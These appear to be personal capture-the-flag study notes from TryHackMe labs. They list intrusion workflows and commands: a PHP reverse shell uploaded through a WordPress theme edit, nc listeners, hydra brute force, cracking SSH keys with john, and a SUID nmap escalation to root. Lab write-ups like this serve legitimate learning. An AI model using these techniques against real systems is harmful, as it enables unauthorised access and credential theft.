

## Mr Robot / TryHackMe notes
- Found keys: 073403c8..., 822c7395..., 04787dde...
- Workflow: nmap -> gobuster -> found robots & fsocity.dic -> pentestmonkey PHP reverse shell upload via WP theme edit -> nc listener -> stabilize shell (python pty) -> john for md5 -> su robot -> find SUID nmap -> nmap --interactive -> !sh -> root.
- Commands used often: `gobuster`, `nmap -sC -sV`, `hydra`, `nc -lvnp`, `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `find / -perm -4000`, `/opt/john/ssh2john.py`.

## Wireshark PCAP lab
- FTP brute-force observed via Hydra to user 'jenny', password 'password123' in capture, working dir `/var/www/html`, uploaded `shell.php` referencing pentestmonkey reverse shell, spawned TTY, escalated to root and downloaded Reptile rootkit.

## Basic Pentesting lab (SMB & SSH)
- Enumerated SMB shares; anonymous login allowed -> downloaded `staff.txt` containing usernames Jan and Kay.
- Found Kay's `.ssh/id_rsa` with weak permissions -> converted with ssh2john -> cracked passphrase with john -> `ssh -i id_rsa kay@host` -> got shell as Kay -> found root flag.
- Important commands: `smbclient -L //<IP>/ -N`, `enum4linux`, `ssh2john.py`, `john`.

## Command snippets you used
- `hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<IP>`
- `gobuster dir -u http://<host> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q -o gobuster_output.txt`
- `python3 -m http.server 8000` (serve files to target via wget)
- `nc -lvnp 3080` / `nc -lvnp 4444`

--
